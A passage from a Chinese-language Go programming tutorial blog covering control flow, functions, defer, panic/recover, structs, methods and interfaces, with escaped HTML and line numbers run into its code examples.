fmt.Println("x is greater than 10")&#125; else &#123; //else的位置要在 &#123;同一行 fmt.Println("x is less than 10")&#125;//这个地方如果这样调用就编译出错了，因为x是条件里面的变量fmt.Println(x) 多条件if1234567if integer == 3 &#123; fmt.Println("The integer is equal to 3")&#125; else if integer &lt; 3 &#123; fmt.Println("The integer is less than 3")&#125; else &#123; fmt.Println("The integer is greater than 3")&#125; goto语句用法，注：标签名是大小写敏感的1234567func myFunc() &#123; i := 0Here: //这行的第一个词，以冒号结束作为标签 println(i) i++ goto Here //跳转到Here去&#125; for语句Go语言的for语句既可以用来循环读取数据，又可以当作while来控制逻辑，还能迭代操作。 循环读数据 1234567891011package mainimport "fmt"func main()&#123; sum := 0; for index:=0; index &lt; 10 ; index++ &#123; sum += index &#125; fmt.Println("sum is equal to ", sum)&#125;// 输出：sum is equal to 45 当while用 1234sum := 1for sum &lt; 1000 &#123; sum += sum&#125; 配合range 迭代 1234for k,v:=range map &#123; fmt.Println("map's key:",k) fmt.Println("map's val:",v)&#125; 这里因为Go 支持 “多值返回”, 而对于“声明而未被调用”的变量, 编译器会报错, 在这种情况下, 可以使用_来丢弃不需要的返回值123for _, v := range map&#123; fmt.Println("map's val:", v)&#125; switch语句Go的switch非常灵活，表达式不必是常量或整数，执行的过程从上至下，直到找到匹配项；而如果switch没有表达式，它会匹配true1234567891011i := 10switch i &#123;case 1: fmt.Println("i is equal to 1")case 2, 3, 4: fmt.Println("i is equal to 2, 3 or 4")case 10: fmt.Println("i is equal to 10")default: fmt.Println("All I know is that i is an integer")&#125; Go里面switch默认相当于每个case最后带有break，匹配成功后不会自动向下执行其他case，而是跳出整个switch, 但是可以使用fallthrough强制执行后面的case代码。12345678910111213141516171819202122232425integer := 6switch integer &#123;case 4: fmt.Println("The integer was &lt;= 4") fallthroughcase 5: fmt.Println("The integer was &lt;= 5") fallthroughcase 6: fmt.Println("The integer was &lt;= 6") fallthroughcase 7: fmt.Println("The integer was &lt;= 7") fallthroughcase 8: fmt.Println("The integer was &lt;= 8") fallthroughdefault: fmt.Println("default case")&#125;//输出//The integer was &lt;= 6//The integer was &lt;= 7//The integer was &lt;= 8//default case 函数声明声明格式如下12345func funcName(input1 type1, input2 type2) (output1 type1, output2 type2) &#123; //这里是处理逻辑代码 //返回多个值 return value1, value2&#125; 从上面的代码可以看出 关键字func用来声明一个函数funcName 函数可以有一个或者多个参数，每个参数后面带有类型，通过,分隔 函数可以返回多个值 上面返回值声明了两个变量output1和output2，如果你不想声明也可以，直接就两个类型 如果只有一个返回值且不声明返回值变量，那么你可以省略 包括返回值 的括号 如果没有返回值，那么就直接省略最后的返回信息 如果有返回值， 那么必须在函数的外层添加return语句 下面一个简单代码示例123456789101112131415package mainimport "fmt"func max(a, b int) int &#123; if a &gt; b &#123; return a &#125; return b&#125;func main() &#123; a, b := 1, 7 fmt.Printf("Max(%d,%d):%d", a, b, max(a, b))&#125; 多个返回值Go语言比C更先进的特性，其中一点就是函数能够返回多个值。1234567891011121314151617package mainimport "fmt"//返回 A+B 和 A*Bfunc SumAndProduct(A, B int) (int, int) &#123; return A+B, A*B&#125;func main() &#123; x := 3 y := 4 xPLUSy, xTIMESy := SumAndProduct(x, y) fmt.Printf("%d + %d = %d\n", x, y, xPLUSy) fmt.Printf("%d * %d = %d\n", x, y, xTIMESy)&#125; 上面的例子我们可以看到直接返回了两个参数，当然我们也可以命名返回参数的变量，这个例子里面只是用了两个类型，我们也可以改成如下这样的定义，然后返回的时候不用带上变量名，因为直接在函数里面初始化了。但如果你的函数是导出的(首字母大写)，官方建议：最好命名返回值，因为不命名返回值，虽然使得代码更加简洁了，但是会造成生成的文档可读性差。12345func SumAndProduct(A, B int) (add int, Multiplied int) &#123; add = A+B Multiplied = A*B return&#125; 变参Go函数支持变参。接受变参的函数是有着不定数量的参数的。为了做到这点，首先需要定义函数使其接受变参：func varArg(arg ...int){}arg ...int告诉Go这个函数接受不定数量的参数(可以把int换为别的类型)。注意，这些参数的类型全部是int。在函数体中，变量arg是一个int的slice： 传值与传指针传值实际上是传了这个值的一份copy，当在被调用函数中修改参数值的时候，调用函数中相应实参不会发生任何变化，因为数值变化只作用在copy上。 而传指针能更改参数的值，看下面代码12345678910111213141516171819package mainimport "fmt"//简单的一个函数，实现了参数+1的操作func add1(a *int) int &#123; // 请注意， *a = *a+1 // 修改了a的值 return *a // 返回新值&#125;func main() &#123; x := 3 fmt.Println("x = ", x) // 应该输出 "x = 3" x1 := add1(&amp;x) // 调用 add1(&amp;x) 传x的地址 fmt.Println("x+1 = ", x1) // 应该输出 "x+1 = 4" fmt.Println("x = ", x) // 应该输出 "x = 4"&#125; 变量在内存中是存放于一定地址上的，修改变量实际是修改变量地址处的内存。只有add1函数知道x变量所在的地址，才能修改x变量的值。所以我们需要将x所在地址&amp;x传入函数，并将函数的参数的类型由int改为*int，即改为指针类型，才能在函数中修改x变量的值。此时参数仍然是按copy传递的，只是copy的是一个指针。 传指针有什么好处 传指针使得多个函数能操作同一个对象。 传指针比较轻量级 (8bytes),只是传内存地址，我们可以用指针传递体积大的结构体。如果用参数值传递的话, 在每次copy上面就会花费相对较多的系统开销（内存和时间）。所以当你要传递大的结构体的时候，用指针是一个明智的选择。 Go语言中channel，slice，map这三种类型的实现机制类似指针，所以可以直接传递，而不用取地址后传递指针。（注：若函数需改变slice的长度，则仍需要取地址传递指针） defer延迟（defer）语句，你可以在函数中添加多个defer语句。当函数执行到最后时，这些defer语句会按照逆序执行，最后该函数返回。特别是当你在进行一些打开资源的操作时，遇到错误需要提前返回，在返回前你需要关闭相应的资源，不然很容易造成资源泄露等问题。 下面是defer在打开文件的应用场景。未使用defer12345678910111213141516func ReadWrite() bool &#123; file.Open("file")// 做一些工作 if failureX &#123; file.Close() return false &#125; if failureY &#123; file.Close() return false &#125; file.Close() return true&#125; 使用defer后，代码变得简洁1234567891011func ReadWrite() bool &#123; file.Open("file") defer file.Close() if failureX &#123; return false &#125; if failureY &#123; return false &#125; return true&#125; 如果有很多调用defer，那么defer是采用后进先出模式，所以如下代码会输出4 3 2 1 0123for i := 0; i &lt; 5; i++ &#123; defer fmt.Printf("%d ", i)&#125; 函数作为值类型Go中函数也是一种变量，我们可以通过type来定义它，它的类型就是所有拥有相同的参数，相同的返回值的一种类型type typeName func(input1 inputType1 , input2 inputType2 [, ...]) (result1 resultType1 [, ...]) 如下面例子123456789101112131415161718192021222324252627282930313233343536373839package mainimport "fmt"type testInt func(int) bool // 声明了一个函数类型func isOdd(integer int) bool &#123; if integer%2 == 0 &#123; return false &#125; return true&#125;func isEven(integer int) bool &#123; if integer%2 == 0 &#123; return true &#125; return false&#125;// 声明的函数类型在这个地方当做了一个参数func filter(slice []int, f testInt) []int &#123; var result []int for _, value := range slice &#123; if f(value) &#123; result = append(result, value) &#125; &#125; return result&#125;func main()&#123; slice := []int &#123;1, 2, 3, 4, 5, 7&#125; fmt.Println("slice = ", slice) odd := filter(slice, isOdd) // 函数当做值来传递了 fmt.Println("Odd elements of slice are: ", odd) even := filter(slice, isEven) // 函数当做值来传递了 fmt.Println("Even elements of slice are: ", even)&#125; 函数当做值和类型在我们写一些通用接口的时候非常有用，通过上面例子我们看到testInt这个类型是一个函数类型，然后两个filter函数的参数和返回值与testInt类型是一样的，但是我们可以实现很多种的逻辑，这样使得我们的程序变得非常的灵活。 Panic和RecoverGo没有像Java那样的异常机制，它不能抛出异常，而是使用了panic和recover机制。一定要记住，你应当把它作为最后的手段来使用，也就是说，你的代码中应当没有，或者很少有panic的东西。这是个强大的工具，请明智地使用它。那么，我们应该如何使用它呢？Panic 是一个内建函数，可以中断原有的控制流程，进入一个令人恐慌的流程中。当函数F调用panic，函数F的执行被中断，但是F中的延迟函数会正常执行，然后F返回到调用它的地方。在调用的地方，F的行为就像调用了panic。这一过程继续向上，直到发生panic的goroutine中所有调用的函数返回，此时程序退出。恐慌可以直接调用panic产生。也可以由运行时错误产生，例如访问越界的数组。 Recover 是一个内建的函数，可以让进入令人恐慌的流程中的goroutine恢复过来。recover仅在延迟函数中有效。在正常的执行过程中，调用recover会返回nil，并且没有其它任何效果。如果当前的goroutine陷入恐慌，调用recover可以捕获到panic的输入值，并且恢复正常的执行。 Go中可以抛出一个panic的异常，然后在defer中通过recover捕获这个异常，然后正常处理。下面是一个例子1234567891011121314151617181920212223242526272829303132333435package mainimport "fmt"func main() &#123; defer func() &#123; // 必须要先声明defer，否则不能捕获到panic异常 fmt.Println("c") if err := recover(); err != nil &#123; fmt.Println(err) // 这里的err其实就是panic传入的内容，55 &#125; fmt.Println("d") &#125;() //匿名函数 f()&#125;func f() &#123; fmt.Println("a") panic(55) fmt.Println("b") fmt.Println("f")&#125; recover必须定义在panic之前的defer语句中。在这种情况下，当panic被触发时，该goroutine不会简单的终止，而是会执行在它之前定义的defer语句。上面代码输出结果为1234ac55d main、init函数Go里面有两个保留的函数：init函数（能够应用于所有的package）和main函数（只能应用于package main）。这两个函数在定义时不能有任何的参数和返回值。虽然一个package里面可以写任意多个init函数，但这无论是对于可读性还是以后的可维护性来说，我们都强烈建议用户在一个package中每个文件只写一个init函数。 Go程序会自动调用init()和main()，所以你不需要在任何地方调用这两个函数。每个package中的init函数都是可选的，但package main就必须包含一个main函数。下面是代码示例mypkg包，里面有两个init函数1234567891011121314151617package mypkgimport ( "fmt")var I intfunc init() &#123; I = 0 fmt.Println("Call mypackage init1")&#125;func init() &#123; I = 1 fmt.Println("Call mypackage init2")&#125; main.go12345678910package mainimport ( "fmt" mypkg "initFunc")func main() &#123; fmt.Println("Hello go.... I = ", mypkg.I)&#125; 上面代码中main函数不用介绍在所有语言中都一样，它作为一个程序的入口，只能有一个。init函数在每个package是可选的，可有可无，甚至可以有多个(但是强烈建议一个package中一个init函数)，init函数在你导入该package时程序会自动调用init函数，所以init函数不用我们手动调用,l另外它只会被调用一次，因为当一个package被多次引用时，它只会被导入一次。上面代码执行结果123Call mypackage init1Call mypackage init2Hello go.... I = 1 struct类型struct声明Go语言中，也和C或者其他语言一样，我们可以声明新的类型，作为其它类型的属性或字段的容器。例如，我们可以创建一个自定义类型person代表一个人的实体。这个实体拥有属性：姓名和年龄。这样的类型我们称之struct。如下代码所示:1234type person &#123; name string age int&#125; 使用结构体12345678910type person struct &#123; name string age int&#125;var P person // P现在就是person类型的变量了P.name = "Astaxie" // 赋值"Astaxie"给P的name属性.P.age = 25 // 赋值"25"给变量P的age属性fmt.Printf("The person's name is %s", P.name) // 访问P的name属性. 另外的几种声明方式 按照顺序提供初始化值p := person{&quot;miracle778&quot;,21} 按照field:value的方式初始化，这样可以任意顺序p:= person{age:17,name:&quot;miracle778&quot;} 通过new分配一个指针,此处的p类型为 *personp := new(person) 完整使用struct的例子12345678910111213141516171819202122232425262728293031323334353637383940414243package mainimport "fmt"// 声明一个新的类型type person struct &#123; name string age int&#125;// 比较两个人的年龄，返回年龄大的那个人，并且返回年龄差// struct也是传值的func Older(p1, p2 person) (person, int) &#123; if p1.age&gt;p2.age &#123; // 比较p1和p2这两个人的年龄 return p1, p1.age-p2.age &#125; return p2, p2.age-p1.age&#125;func main() &#123; var tom person // 赋值初始化 tom.name, tom.age = "Tom", 18 // 两个字段都写清楚的初始化 bob := person&#123;age:25, name:"Bob"&#125; // 按照struct定义顺序初始化值 paul := person&#123;"Paul", 43&#125; tb_Older, tb_diff := Older(tom, bob) tp_Older, tp_diff := Older(tom, paul) bp_Older, bp_diff := Older(bob, paul) fmt.Printf("Of %s and %s, %s is older by %d years\n", tom.name, bob.name, tb_Older.name, tb_diff) fmt.Printf("Of %s and %s, %s is older by %d years\n", tom.name, paul.name, tp_Older.name, tp_diff) fmt.Printf("Of %s and %s, %s is older by %d years\n", bob.name, paul.name, bp_Older.name, bp_diff)&#125; struct的匿名字段上面介绍了如何定义一个struct，定义的时候是字段名与其类型一一对应，实际上Go支持只提供类型，而不写字段名的方式，也就是匿名字段，也称为嵌入字段。当匿名字段是一个struct的时候，那么这个struct所拥有的全部字段都被隐式地引入了当前定义的这个struct。 如下面例子第11行，匿名字段为struct123456789101112131415161718192021222324252627282930313233343536package mainimport "fmt"type Human struct &#123; name string age int weight int&#125;type Student struct &#123; Human // 匿名字段，那么默认Student就包含了Human的所有字段 speciality string&#125;func main() &#123; // 我们初始化一个学生 mark := Student&#123;Human&#123;"Mark", 25, 120&#125;, "Computer Science"&#125; // 我们访问相应的字段 fmt.Println("His name is ", mark.name) fmt.Println("His age is ", mark.age) fmt.Println("His weight is ", mark.weight) fmt.Println("His speciality is ", mark.speciality) // 修改对应的备注信息 mark.speciality = "AI" fmt.Println("Mark changed his speciality") fmt.Println("His speciality is ", mark.speciality) // 修改他的年龄信息 fmt.Println("Mark become old") mark.age = 46 fmt.Println("His age is", mark.age) // 修改他的体重信息 fmt.Println("Mark is not an athlet anymore") mark.weight += 60 fmt.Println("His weight is", mark.weight)&#125; 上面代码，Student可以访问属性age和name，实现了字段的继承。 此外student还能访问Human这个字段作为字段名。如下面代码12mark.Human = Human&#123;"Marcus", 55, 220&#125;mark.Human.age -= 1 所有的内置类型和自定义类型都是可以作为匿名字段的。请看下面的例子123456789101112131415161718192021222324252627282930313233343536package mainimport "fmt"type Skills []string //Skills 用slice类型，可以通过append函数修改增加type Human struct &#123; name string age int weight int&#125;type Student struct &#123; Human // 匿名字段，struct Skills // 匿名字段，自定义的类型string slice int // 内置类型作为匿名字段 speciality string&#125;func main() &#123; // 初始化学生Jane jane := Student&#123;Human:Human&#123;"Jane", 35, 100&#125;, speciality:"Biology"&#125; // 现在我们来访问相应的字段 fmt.Println("Her name is ", jane.name) fmt.Println("Her age is ", jane.age) fmt.Println("Her weight is ", jane.weight) fmt.Println("Her speciality is ", jane.speciality) // 我们来修改他的skill技能字段 jane.Skills = []string&#123;"anatomy"&#125; fmt.Println("Her skills are ", jane.Skills) fmt.Println("She acquired two new ones ") jane.Skills = append(jane.Skills, "physics", "golang") fmt.Println("Her skills now are ", jane.Skills) // 修改匿名内置类型字段 jane.int = 3 fmt.Println("Her preferred number is", jane.int)&#125; 当继承的字段名重复了的时候，最外层的优先访问，利用这个特性，可以实现重载功能。如下例123456789101112131415161718192021package mainimport "fmt"type Human struct &#123; name string age int phone string // Human类型拥有的字段&#125;type Employee struct &#123; Human // 匿名字段Human speciality string phone string // 雇员的phone字段&#125;func main() &#123; Bob := Employee&#123;Human&#123;"Bob", 34, "777-444-XXXX"&#125;, "Designer", "333-222"&#125; fmt.Println("Bob's work phone is:", Bob.phone) // 如果我们要访问Human的phone字段 fmt.Println("Bob's personal phone is:", Bob.Human.phone)&#125; 面向对象上面结构体有匿名字段继承等操作，如果把函数当成struct的字段处理，就是面向对象。函数的另一种形态，带有接收者的函数，我们称为method method声明method是附属在一个给定的类型上的，他的语法和函数的声明语法几乎一样，只是在func后面增加了一个receiver(也就是method所依从的主体)。method声明方法如下func (r ReceiverType) funcName(parameters) (results) 下面看个例子12345678910111213141516171819202122232425262728293031323334package mainimport ( "fmt" "math")type Rectangle struct &#123; width, height float64&#125;type Circle struct &#123; radius float64&#125;func (r Rectangle) area() float64 &#123; //接受者是Rectangle类型 return r.width*r.height&#125;func (c Circle) area() float64 &#123; //接受者是Circle类型 return c.radius * c.radius * math.Pi&#125;func main() &#123; r1 := Rectangle&#123;12, 2&#125; r2 := Rectangle&#123;9, 4&#125; c1 := Circle&#123;10&#125; c2 := Circle&#123;25&#125; fmt.Println("Area of r1 is: ", r1.area()) fmt.Println("Area of r2 is: ", r2.area()) fmt.Println("Area of c1 is: ", c1.area()) fmt.Println("Area of c2 is: ", c2.area())&#125; 使用method时注意几点 虽然method的名字一模一样，但是如果接收者不一样，那么method就不一样 method里面可以访问接收者的字段 调用method通过.访问，就像struct里面访问字段一样 在上例，method area() 分别属于Rectangle和Circle， 于是他们的 Receiver 就变成了Rectangle 和 Circle, 或者说，这个area()方法 是由 Rectangle/Circle 发出的。 值得说明的一点是，图示中method用虚线标出，意思是此处方法的Receiver是以值传递，而非引用传递，是的，Receiver还可以是指针, 两者的差别在于, 指针作为Receiver会对实例对象的内容发生操作,而普通类型作为Receiver仅仅是以副本作为操作对象,并不对原实例对象发生操作，下面对此会有详细论述。 receiver为指针为了说明 指针作为receiver的用法，下面放一个复杂点例子123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package mainimport "fmt"const( WHITE = iota BLACK BLUE RED YELLOW)type Color bytetype Box struct &#123; width, height, depth float64 color Color&#125;type BoxList []Box //a slice of boxesfunc (b Box) Volume() float64 &#123; return b.width * b.height * b.depth&#125;func (b *Box) SetColor(c Color) &#123; b.color = c&#125;func (bl BoxList) BiggestColor() Color &#123; v := 0.00 k := Color(WHITE) for _, b := range bl &#123; if bv := b.Volume(); bv &gt; v &#123; v = bv k = b.color &#125; &#125; return k&#125;func (bl BoxList) PaintItBlack() &#123; for i, _ := range bl &#123; bl[i].SetColor(BLACK) &#125;&#125;func (c Color) String() string &#123; strings := []string &#123;"WHITE", "BLACK", "BLUE", "RED", "YELLOW"&#125; return strings[c]&#125;func main() &#123; boxes := BoxList &#123; Box&#123;4, 4, 4, RED&#125;, Box&#123;10, 10, 1, YELLOW&#125;, Box&#123;1, 1, 20, BLACK&#125;, Box&#123;10, 10, 1, BLUE&#125;, Box&#123;10, 30, 1, WHITE&#125;, Box&#123;20, 20, 20, YELLOW&#125;, &#125; fmt.Printf("We have %d boxes in our set\n", len(boxes)) fmt.Println("The volume of the first one is", boxes[0].Volume(), "cm³") fmt.Println("The color of the last one is",boxes[len(boxes)-1].color.String()) fmt.Println("The biggest one is", boxes.BiggestColor().String()) fmt.Println("Let's paint them all black") boxes.PaintItBlack() fmt.Println("The color of the second one is", boxes[1].color.String()) fmt.Println("Obviously, now, the biggest one is", boxes.BiggestColor().String())&#125; 上面代码的第25行，SetColor method的receiver是 Box，这里是因为要改变Box的属性，所以用&#42;Box。那26行按道理应该是`b.color = c这样写，但是上面代码却写成了b.color = c,事实上，在Go语言中，两种写法都行。当你用指针去访问相应的字段时(虽然指针没有任何的字段)，Go知道你要通过指针去获取这个值。 我们又看到43行的语句，在PaintItBlack里面调用SetColor的时候是不是应该写成(&amp;bl[i]).SetColor(BLACK)，因为SetColor的receiver是*Box，而不是Box。但示例代码写成了bl[i].SetColor(BLACK)`。事实上，这两种写法都行。因为Go知道receiver是指针，他自动帮你转了。 也就是说 如果一个method的receiver是*T,你可以在一个T类型的实例变量V上面调用这个method，而不需要&amp;V去调用这个method 类似的 如果一个method的receiver是T，你可以在一个T类型的变量P上面调用这个method，而不需要 P去调用这个method 所以，你不用担心你是调用的指针的method还是不是指针的method，Go知道你要做的一切。通俗讲就是，不管method声明的时候是func (var *struct) name() {}还是func (var struct) name() {},调用的时候var.name()可以通用。(个人理解，可能有误) method继承method也是可以继承的。如果匿名字段实现了一个method，那么包含这个匿名字段的struct也能调用该method。如下例12345678910111213141516171819202122232425262728293031package mainimport "fmt"type Human struct &#123; name string age int phone string&#125;type Student struct &#123; Human //匿名字段 school string&#125;type Employee struct &#123; Human //匿名字段 company string&#125;//在human上面定义了一个methodfunc (h *Human) SayHi() &#123; fmt.Printf("Hi, I am %s you can call me on %s\n", h.name, h.phone)&#125;func main() &#123; mark := Student&#123;Human&#123;"Mark", 25, "222-222-YYYY"&#125;, "MIT"&#125; sam := Employee&#123;Human&#123;"Sam", 45, "111-888-XXXX"&#125;, "Golang Inc"&#125; mark.SayHi() sam.SayHi()&#125; method 重写和上面struct匿名字段冲突一样的道理，我们可以在Employee上面定义一个method，重写了匿名字段的方法。12345678910111213141516171819202122232425262728293031323334353637package mainimport "fmt"type Human struct &#123; name string age int phone string&#125;type Student struct &#123; Human //匿名字段 school string&#125;type Employee struct &#123; Human //匿名字段 company string&#125;//Human定义methodfunc (h *Human) SayHi() &#123; fmt.Printf("Hi, I am %s you can call me on %s\n", h.name, h.phone)&#125;//Employee的method重写Human的methodfunc (e *Employee) SayHi() &#123; fmt.Printf("Hi, I am %s, I work at %s. Call me on %s\n", e.name, e.company, e.phone) //Yes you can split into 2 lines here.&#125;func main() &#123; mark := Student&#123;Human&#123;"Mark", 25, "222-222-YYYY"&#125;, "MIT"&#125; sam := Employee&#123;Human&#123;"Sam", 45, "111-888-XXXX"&#125;, "Golang Inc"&#125; mark.SayHi() sam.SayHi()&#125; 规则通过这些内容，我们可以设计出基本的面向对象的程序了，但是Go里面的面向对象是如此的简单，没有任何的私有、公有关键字，通过大小写来实现(大写开头的为公有，小写开头的为私有)，方法也同样适用这个原则。 interface什么是interface简单的说，interface是一组method的组合，我们通过interface来定义对象的一组行为。上面method重写例子中Student和Employee都能SayHi，虽然他们的内部实现不一样，但是那不重要，重要的是他们都能say hi 让我们来继续做更多的扩展，Student和Employee实现另一个方法Sing，然后Student实现方法BorrowMoney而Employee实现SpendSalary。这样Student实现了三个方法：SayHi、Sing、BorrowMoney；而Employee实现了SayHi、Sing、SpendSalary。 上面这些方法的组合称为interface(被对象Student和Employee实现)。例如Student和Employee都实现了interface：SayHi和Sing，也就是这两个对象是该interface类型。而Employee没有实现这个interface：SayHi、Sing和BorrowMoney，因为Employee没有实现BorrowMoney这个方法。 interface类型interface类型定义了一组方法，如果某个对象实现了某个接口的所有方法，则此对象就实现了此接口。详细的语法参考下面这个例子12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667type Human struct &#123; name string age int phone string&#125;type Student struct &#123; Human //匿名字段Human school string loan float32&#125;type Employee struct &#123; Human //匿名字段Human company string money float32&#125;//Human对象实现Sayhi方法func (h *Human) SayHi() &#123; fmt.Printf("Hi, I am %s you can call me on %s\n", h.name, h.phone)&#125;// Human对象实现Sing方法func (h *Human) Sing(lyrics string) &#123; fmt.Println("La la, la la la, la la la la la...", lyrics)&#125;//Human对象实现Guzzle方法func (h *Human) Guzzle(beerStein string) &#123; fmt.Println("Guzzle Guzzle Guzzle...", beerStein)&#125;// Employee重载Human的Sayhi方法func (e *Employee) SayHi() &#123; fmt.Printf("Hi, I am %s, I work at %s. Call me on %s\n", e.name, e.company, e.phone) //此句可以分成多行&#125;//Student实现BorrowMoney方法func (s *Student) BorrowMoney(amount float32) &#123; s.loan += amount // (again and again and...)&#125;//Employee实现SpendSalary方法func (e *Employee) SpendSalary(amount float32) &#123; e.money -= amount // More vodka please!!! Get me through the day!&#125;// 定义interfacetype Men interface &#123; SayHi() Sing(lyrics string) Guzzle(beerStein string)&#125;type YoungChap interface &#123; SayHi() Sing(song string) BorrowMoney(amount float32)&#125;type ElderlyGent interface &#123; SayHi() Sing(song string) SpendSalary(amount float32)&#125; interface值如果我们定义了一个interface的变量，那么这个变量里面可以存实现这个interface的任意类型的对象。例如上面例子中，我们定义了一个Men interface类型的变量m，那么m里面可以存Human、Student或者Employee值 因为m能够持有这三种类型的对象，所以我们可以定义一个包含Men类型元素的slice，这个slice可以被赋予实现了Men接口的任意结构的对象，这个和我们传统意义上面的slice有所不同。如下面例子123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package mainimport "fmt"type Human struct &#123; name string age int phone string&#125;type Student struct &#123; Human //匿名字段 school string loan float32&#125;type Employee struct &#123; Human //匿名字段 company string money float32&#125;//Human实现SayHi方法func (h Human) SayHi() &#123; fmt.Printf("Hi, I am %s you can call me on %s\n", h.name, h.phone)&#125;//Human实现Sing方法func (h Human) Sing(lyrics string) &#123; fmt.Println("La la la la...", lyrics)&#125;//Employee重载Human的SayHi方法func (e Employee) SayHi() &#123; fmt.Printf("Hi, I am %s, I work at %s. Call me on %s\n", e.name, e.company, e.phone) &#125;// Interface Men被Human,Student和Employee实现// 因为这三个类型都实现了这两个方法type Men interface &#123; SayHi() Sing(lyrics string)&#125;func main() &#123; mike := Student&#123;Human&#123;"Mike", 25, "222-222-XXX"&#125;, "MIT", 0.00&#125; paul := Student&#123;Human&#123;"Paul", 26, "111-222-XXX"&#125;, "Harvard", 100&#125; sam := Employee&#123;Human&#123;"Sam", 36, "444-222-XXX"&#125;, "Golang Inc.", 1000&#125; tom := Employee&#123;Human&#123;"Tom", 37, "222-444-XXX"&#125;, "Things Ltd.", 5000&#125; //定义Men类型的变量i var i Men //i能存储Student i = mike fmt.Println("This is Mike, a Student:") i.SayHi() i.Sing("November rain") //i也能存储Employee i = tom fmt.Println("This is tom, an Employee:") i.SayHi() i.Sing("Born to be wild") //定义了slice Men fmt.Println("Let's use a slice of Men and see what happens") x := make([]Men, 3) //这三个都是不同类型的元素，但是他们实现了interface同一个接口 x[0], x[1], x[2] = paul, sam, mike for _, value := range x&#123; value.SayHi() &#125;&#125; 空interface空interface(interface{})不包含任何的method，正因为如此，所有的类型都实现了空interface。空interface对于描述起不到任何的作用(因为它不包含任何的method），但是空interface在我们需要存储任意类型的数值的时候相当有用，因为它可以存储任意类型的数值。它有点类似于C语言的void*类型。 空interface使用示例1234567// 定义a为空接口var a interface&#123;&#125;var i int = 5s := "Hello world"// a可以存储任意类型的数值a = ia = s 一个函数把interface{}作为参数，那么他可以接受任意类型的值作为参数，如果一个函数返回interface{},那么也就可以返回任意类型的值。 interface函数参数interface的变量可以持有任意实现该interface类型的对象，这给我们编写函数(包括method)提供了一些额外的思考，我们是不是可以通过定义interface参数，让函数接受各种类型的参数例如fmt.Println函数可以接受任意类型的数据输出，那是因为其源文件内部实现有这样一个定义123type Stringer interface &#123; String() string&#125; 也就是说，任何实现了String方法的类型都能作为参数被fmt.Println调用12345678910111213141516171819202122232425package mainimport ( "fmt" "strconv")type Human struct &#123; name string age int phone string&#125;// 通过这个方法 Human 实现了 fmt.Stringerfunc (h Human) String() string &#123; return "❰"+h.name+" - "+strconv.Itoa(h.age)+" years - ✆ " +h.phone+"❱" //strconv里两个函数 Itoa，int to string ; Atoi string to int&#125;func main() &#123; Bob := Human&#123;"Bob", 39, "000-7777-XXX"&#125; fmt.Println("This Human is : ", Bob)&#125;//该程序输出This Human is : ❰Bob - 39 years - ✆ 000-7777-XXX❱ 现在我们再回顾一下前面的Box示例，你会发现Color结构也定义了一个method：String。其实这也是实现了fmt.Stringer这个interface，即如果需要某个类型能被fmt包以特殊的格式输出，你就必须实现Stringer这个接口。如果没有实现这个接口，fmt将以默认的方式输出。 注：实现了error接口的对象（即实现了Error() string的对象），使用fmt输出时，会调用Error()方法，因此不必再定义String()方法了。 interface变量存储的类型我们知道interface的变量里面可以存储任意类型的数值(该类型实现了interface)。那么我们怎么反向知道这个变量里面实际保存了的是哪个类型的对象呢？目前常用的有两种方法：1、 Comma-ok断言Go语言里面有一个语法，可以直接判断是否是该类型的变量： value, ok = element.(T)，这里value就是变量的值，ok是一个bool类型，element是interface变量，T是断言的类型。如果element里面确实存储了T类型的数值，那么ok返回true，否则返回false。如下例1234567891011121314151617181920212223242526272829303132package mainimport ( "fmt" "strconv")type Element interface&#123;&#125;type List [] Elementtype Person struct &#123; name string age int&#125;//定义了String方法，实现了fmt.Stringerfunc (p Person) String() string &#123; return "(name: " + p.name + " - age: "+strconv.Itoa(p.age)+ " years)"&#125;func main() &#123; list := make(List, 3) list[0] = 1 // an int list[1] = "Hello" // a string list[2] = Person&#123;"Dennis", 70&#125; for index, element := range list &#123; if value, ok := element.(int); ok &#123; fmt.Printf("list[%d] is an int and its value is %d\n", index,value) &#125; else if value, ok := element.(string); ok &#123; fmt.Printf("list[%d] is a string and its value is %s\n",index, value) &#125; else if value, ok := element.(Person); ok &#123; fmt.Printf("list[%d] is a Person and its value is %s\n",index, value) &#125; else &#123; fmt.Printf("list[%d] is of a different type\n", index) &#125; &#125;&#125; 不过这里用到多个if else，有点冗余。这里就可以用到另一种方法，switch 2、switch测试把上面的例子用switch重写一下123456789101112131415161718192021222324252627282930313233package mainimport ( "fmt" "strconv")type Element interface&#123;&#125;type List [] Elementtype Person struct &#123; name string age int&#125;//打印func (p Person) String() string &#123; return "(name: " + p.name + " - age: "+strconv.Itoa(p.age)+ " years)"&#125;func main() &#123; list := make(List, 3) list[0] = 1 //an int list[1] = "Hello" //a string list[2] = Person&#123;"Dennis", 70&#125; for index, element := range list&#123; switch value := element.(type) &#123; case int: fmt.Printf("list[%d] is an int and its value is %d\n",index, value) case string: fmt.Printf("list[%d] is a string and its value is %s\n",index, value) case Person: fmt.Printf("list[%d] is a Person and its value is %s\n",index, value) default: fmt.Println("list[%d] is of a different type", index) &#125; &#125;&#125; 这里用到了 element.(type),需要强调的是：element.(type)语法不能在switch外的任何逻辑里面使用，如果你要在switch外面判断一个类型就使用comma-ok。 嵌入interface如果一个interface1作为interface2的一个嵌入字段，那么interface2隐式的包含了interface1里面的method。类似于struct里面的匿名字段源码包container/heap里面有这样的一个定义12345type Interface interface &#123; sort.Interface //嵌入字段sort.Interface Push(x interface&#123;&#125;) //a Push method to push elements into the heap Pop() interface&#123;&#125; //a Pop elements that pops elements from the heap&#125; 我们看到sort.Interface其实就是嵌入字段，把sort包里的sort.Interface的所有method给隐式的包含进来了。也就是下面三个方法：123456789type Interface interface &#123; // Len is the number of elements in the collection. Len() int // Less returns whether the element with index i should sort // before the element with index j. Less(i, j int) bool // Swap swaps the elements with indexes i and j. Swap(i, j int)&#125; 另一个例子就是io包下面的 io.ReadWriter ，它包含了io包下面的Reader和Writer两个interface：12345// io.ReadWritertype ReadWriter interface &#123; Reader Writer&#125; 反射反射是程序执行时检查其所拥有的结构。尤其是类型的一种能力。所谓反射就是能检查程序在运行时的状态。我们一般用到的包是reflect包。python中用hasattr方法实现。go语言中的反射通过refect包实现，reflect包实现了运行时反射，允许程序操作任意类型的对象。具体参考:https://www.cnblogs.com/wdliu/p/9222283.html 待更并发]]></content>
      <categories>
        <category>Study</category>
        <category>Go</category>
      </categories>
      <tags>
